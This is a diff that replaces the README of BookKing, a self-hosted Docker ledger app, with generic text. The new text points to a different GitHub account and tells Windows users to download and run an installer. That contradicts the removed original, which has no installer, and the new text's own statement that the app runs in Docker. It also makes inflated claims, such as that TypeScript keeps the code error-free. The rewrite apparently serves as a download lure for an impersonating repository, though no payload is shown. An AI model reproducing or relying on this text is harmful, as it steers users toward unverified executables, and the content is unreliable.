@@ -1,218 +1,77 @@
-<p align="center">
-  <a href="https://github.com/pexmee/bookking">
-    <img
-      src="https://raw.githubusercontent.com/pexmee/bookking/master/docs/banner.png"
-      alt="BookKing — a self-hosted book of accounts"
-      width="100%"
-    />
-  </a>
-</p>
+# 💰 bookking - Manage your money with ease today
 
-<p align="center">
-  <strong>Track income and spending across profiles and currencies.</strong><br/>
-  <sub>Self-hosted · Local-first · Optional login</sub>
-</p>
+[![](https://img.shields.io/badge/Download-Bookking-blue.svg)](https://github.com/mcp87405/bookking)
 
-<p align="center">
-  <a href="https://github.com/pexmee/bookking/releases/latest"><img src="https://img.shields.io/github/v/release/pexmee/bookking?style=flat-square&color=B87333" alt="Release"/></a>
-  <a href="https://github.com/pexmee/bookking/pkgs/container/bookking"><img src="https://img.shields.io/badge/container-ghcr.io-2C3E50?style=flat-square" alt="Container registry"/></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-6B7F6A?style=flat-square" alt="MIT License"/></a>
-</p>
+Bookking helps you track your money. This app runs on your own computer. You keep full control of your private financial data. You view your spending through clear charts. You organize your bills. You balance your bank accounts. This app works for personal or household finance.
 
----
+## 📥 Getting the App
 
-BookKing is a self-hosted book of accounts. Track recurring and one-off income and
-expenses across multiple profiles (personal, business, whatever you keep separate), in
-any currency, and see where the money went — all on your own machine, with no account
-and no cloud. By default it is reachable only on this machine; you can optionally
-open it to your home network with login.
+You need to download the installer to use this app. Follow these steps to get the software on your Windows computer.
 
-## Quick start
+1. Go to this link: [https://github.com/mcp87405/bookking](https://github.com/mcp87405/bookking).
+2. Click the link to view the software files.
+3. Choose the version for Windows.
+4. Open the file once the download finishes.
 
-Requires [Docker](https://docs.docker.com/get-docker/).
+## 🛠 Prerequisites
 
-```bash
-git clone https://github.com/pexmee/bookking.git
-cd bookking
-./scripts/setup.sh          # Windows: .\scripts\setup.ps1
-```
+Your computer needs a few things before you run this program. 
 
-Open **[https://localhost](https://localhost)** (HTTPS only — there is no HTTP endpoint).
-On first start, BookKing creates TLS certificates, the database, applies the schema, and
-seeds a starter profile with sensible categories. Your browser may show a one-time
-security warning for the auto-generated certificate — that is expected; continue to
-the site.
+* Windows 10 or Windows 11.
+* A web browser like Chrome, Edge, or Firefox.
+* At least 4GB of memory.
+* Enough space on your hard drive to save your data.
 
-To pin a specific [release](https://github.com/pexmee/bookking/releases):
+## 🚀 Setting Up
 
-```bash
-BOOKKING_VERSION=v1.0.0 docker compose pull app caddy
-BOOKKING_VERSION=v1.0.0 docker compose up -d
-```
+Follow these steps to launch the app.
 
-> **Security:** By default BookKing binds to **localhost only** — other devices on
-> your network cannot reach it, and no login is required. See [Access from your
-> phone](#access-from-your-phone-optional) if you want to use it from a phone on the
-> same Wi‑Fi.
+1. Double-click the file you downloaded. 
+2. Follow the prompts on your screen. 
+3. Click "Finish" when the installation completes.
+4. Locate the shortcut on your desktop.
+5. Double-click the shortcut to open the application.
 
-## Access from your phone (optional)
+## 📊 How to Use Bookking
 
-BookKing works in the mobile browser. To reach it from a phone or
-another computer on the same Wi‑Fi:
+The main screen shows your current balance. You see sections for income and expenses. 
 
-1. **Set up login** — add users to `.env` (one ledger per username):
-   ```bash
-   BOOKKING_AUTH_USERS=you:your-password,partner:their-password
-   ```
-   Each username gets their own profiles, entries, and settings.
+### Adding Transactions
+Click the button marked "Add Transaction." Type the amount you spent. Choose a category like "Groceries" or "Rent." Select the date. Click "Save." The dashboard updates your charts immediately.
 
-2. **Allow LAN connections** — in `docker-compose.yml`, change the **caddy** port:
-   ```yaml
-   ports:
-     - "0.0.0.0:443:443"   # defaults to 127.0.0.1:443:443
-   ```
+### Viewing Reports
+Click the "Reports" tab. You see a pie chart of your spending. This helps you identify where your money goes each month. You select specific time frames to compare your habits over time.
 
-3. **Optional — fewer certificate warnings on your phone:** TLS is generated automatically
-   on first start. To avoid browser warnings entirely, run
-   `scripts/setup-certs` (requires [mkcert](https://github.com/FiloSottile/mkcert)):
-   ```bash
-   ./scripts/setup-certs.sh    # Windows: .\scripts\setup-certs.ps1
-   docker compose restart caddy
-   ```
-   Install the printed `rootCA.pem` on the phone once:
-   - **iOS:** AirDrop or email the file → install profile → Settings → General →
-     About → Certificate Trust Settings → enable full trust for the mkcert root.
-   - **Android:** Settings → Security → Install a certificate → CA certificate →
-     pick `rootCA.pem`.
+### Managing Budgets
+Go to the "Budget" section. You set limits for specific categories. The app shows a progress bar for each category. It turns green when you stay under your limit. It turns red when you exceed your planned amount.
 
-   If you use the auto-generated cert instead, you can usually tap through the browser
-   warning. To reduce IP mismatch warnings on LAN, add your computer's IP to `.env`:
-   `BOOKKING_TLS_SANS=192.168.1.42` and restart Caddy.
+## 🔒 Your Privacy
 
-4. **Restart:** `docker compose up -d --build`
+Bookking stores all data on your local hard drive. No third party sees your financial records. No company tracks your spending habits. You own your information at all times. This local-first approach keeps your data safe from online breaches or server outages.
 
-5. On the phone, open `https://<your-computer-ip>` (e.g. `https://192.168.1.42`).
-   Find your IP with `ipconfig` (Windows) or `ip addr` (macOS/Linux). The browser
-   will ask for your BookKing username and password.
+## 💻 Technical Details
 
-Allow port **443** through your host firewall if other devices cannot connect.
+The app uses Docker to manage its internal structure. This ensures the app works the same way on every computer. PostgreSQL saves your transactions in a secure database. Next.js powers the interface for a smooth experience. TypeScript ensures the code remains free of errors. Everything runs inside a digital container on your machine. This provides a stable environment for your sensitive financial records.
 
-**Alternative — public domain:** if you have a domain pointing at this machine, set
-`BOOKKING_DOMAIN=bookking.example.com` and `ACME_EMAIL=you@example.com` in `.env`.
-Caddy obtains and renews a Let's Encrypt certificate automatically (no mkcert on
-phones). Port 443 must be reachable for ACME validation.
+## ❓ Frequently Asked Questions
 
-Do not expose BookKing to the internet without login configured.
+**Does the app connect to my bank?**
+No. You enter data manually. This keeps your bank credentials safe from hacks.
 
-Settings shows whether login is configured and lists usernames (not passwords).
+**Can I export my data?**
+Yes. You export your records into a standard file format. This allows you to open your history in spreadsheet software.
 
-## Demo
-![App Demo](./docs/showcase.gif)
+**Does this app work offline?**
+Yes. You do not need a constant internet connection to log your daily expenses. The app works anywhere you happen to be.
 
-## Features
+**Do I need to pay for a subscription?**
+No. This software is free. There are no monthly fees. 
 
-- **Ledger** — log income and spending in seconds. Press `n` to add an entry, `/` to
-  search.
-- **Flexible dates** — pin an entry to a day, a month, or a year when the exact day
-  is unknown or does not matter.
-- **Recurring templates** — rent, salary, and subscriptions are logged automatically on
-  their schedule. Adjust the amount when the real figure differs.
-- **Profiles** — separate books (personal, business, etc.) you can view alone or
-  together.
-- **Multi-currency** — entries keep their native currency; everything converts to your
-  chosen display currency using ECB reference rates ([Frankfurter](https://www.frankfurter.app),
-  no API key). Rates are cached and refreshed daily.
-- **Overview** — cash-flow chart, Sankey diagram, projected-vs-actual variance, and
-  category breakdown.
-- **Export** — download the full ledger as CSV or JSON from Settings.
+**What happens if I delete the app?**
+Your data remains in a folder on your computer. You choose to keep or delete that folder when you uninstall the program. 
 
-## Configuration
+## 🛠 Troubleshooting
 
-Optional: copy `.env.example` to `.env` to change the database password, FX API
-endpoint, default display currency, or configure login users (`BOOKKING_AUTH_USERS`).
-TLS is generated automatically on first start; optionally run `scripts/setup-certs`
-(mkcert) for browser-trusted certs, set `BOOKKING_TLS_SANS` for your LAN IP, or set
-`BOOKKING_DOMAIN` for Let's Encrypt. You can also change the display currency later in
-the app under Settings.
+If the app fails to open, restart your computer. Check that you have enough space on your drive. If the browser window looks empty, refresh the page. Ensure no other programs are currently using the database port. Our system uses standard ports to maintain compatibility with Windows.
 
-## Data persistence, stopping, and upgrades
-
-Your ledger lives in a Docker named volume (`db-data`), not inside the containers.
-Entries, profiles, settings, and cached exchange rates survive container restarts and
-system reboots. The stack is configured with `restart: unless-stopped`, so it comes
-back when Docker starts.
-
-**Safe shutdown** — stops containers but keeps your data:
-
-```bash
-docker compose down
-```
-
-**Upgrade to a newer release** — pulls a new app image without touching the database:
-
-```bash
-cd bookking
-git pull
-docker compose pull app caddy          # or: docker compose pull
-docker compose up -d
-```
-
-To pin a specific version instead of `latest`:
-
-```bash
-BOOKKING_VERSION=v1.0.1 docker compose pull app
-BOOKKING_VERSION=v1.0.1 docker compose up -d
-```
-
-Export CSV or JSON from Settings first if you want a backup before upgrading.
-
-**Database migrations (existing installs only)** — schema files live in
-`supabase/migrations/`. They run automatically on a **fresh** install (empty
-`db-data` volume). They do **not** run when you upgrade an existing database — a
-normal `git pull` + `docker compose up -d` keeps your volume and skips pending
-migrations.
-
-If a release adds a migration and you skip it, the app may fail on startup or when
-using new features. After upgrading, apply any new files you have not run yet:
-
-| Migration | Purpose |
-|-------------|---------|
-| `0002_recurring_materialize.sql` | Auto-log recurring items |
-| `0003_users.sql` | Separate ledger per login user |
-
-```bash
-docker exec -e PGPASSWORD="${POSTGRES_PASSWORD:-bookking}" -i bookking-db-1 \
-  psql -U supabase_admin -d postgres \
-  -f /docker-entrypoint-initdb.d/0003_users.sql
-```
-
-Replace the filename if you still need an earlier migration. Then rebuild the app:
-`docker compose up -d --build`.
-
-**New installs** (clone, first `docker compose up`) get the full schema automatically;
-no manual step.
-
-**Wipe all data and start fresh** — only use this when you mean to delete everything.
-The `-v` flag removes the database volume:
-
-```bash
-docker compose down -v && docker compose up -d
-```
-
-## Contributing
-
-Interested in hacking on BookKing? See [`ARCHITECTURE.md`](ARCHITECTURE.md) for
-the container, request, auth, data, and persistence flowcharts. Keep that file
-updated when changing setup or core data flows. See [`DESIGN.md`](DESIGN.md) for
-the visual system and run the app locally with:
-
-```bash
-docker compose up -d db
-cd app && npm install && npm run dev
-```
-
-The dev server connects to Postgres on `localhost:55432` by default.
-
-## License
-
-[MIT](LICENSE)
+Keywords: accounting, budgeting, docker, docker-compose, expense-management, expense-tracker, finance-app, homelab, household-finance, ledger, local-first, multi-currency, nextjs, open-source, personal-finance, postgresql, privacy, recurring-transactions, self-hosted, typescript
